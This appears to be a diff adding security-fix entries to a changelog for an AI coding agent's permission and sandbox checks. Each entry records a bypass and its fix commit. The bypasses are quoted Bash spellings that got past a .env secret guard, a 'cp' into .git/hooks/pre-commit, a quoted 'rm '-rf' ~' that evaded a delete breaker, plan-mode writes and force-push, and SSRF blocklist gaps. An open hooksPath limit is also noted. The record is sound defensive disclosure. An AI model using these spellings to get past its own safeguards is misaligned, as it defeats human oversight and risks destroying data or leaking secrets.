+- **F-J2** `.env` / `.git/config` secret guard bypassed by Grep and quoted Bash spellings — fixed on master in `36f139c50` (+ docs follow-up `3b04aefe8`).
+- **F-J4** `.git/hooks/*` unprotected; accept-edits auto-ran `cp ./x ./.git/hooks/pre-commit` — fixed on master in `a948c3da3` (+ docs follow-up `3b04aefe8`). Known limit: `git config core.hooksPath x` (and similar config keys) redirects hooks without naming `.git/hooks`; the permission mode is the boundary there.
+- **F-P1** Quoted-flag `rm '-rf' ~` bypassed the step-0 breaker and ConfirmRemoveHook — fixed on master in `a87b95aa3`.
+- **F-P2** Plan mode allowed `>f`, `2> f`, `sed -i`, `rm`, `git push --force` — fixed on master in `d3d90fece` (plan Bash is now an allow-list of read-only commands, fail closed; the same commit rewrote the stale PERMISSIONS.md matching section).
+- **F-W1** WebFetch SSRF blocklist missed 100.64/10, 198.18/15, NAT64 and 6to4 — fixed on master in `0594e0e17`.
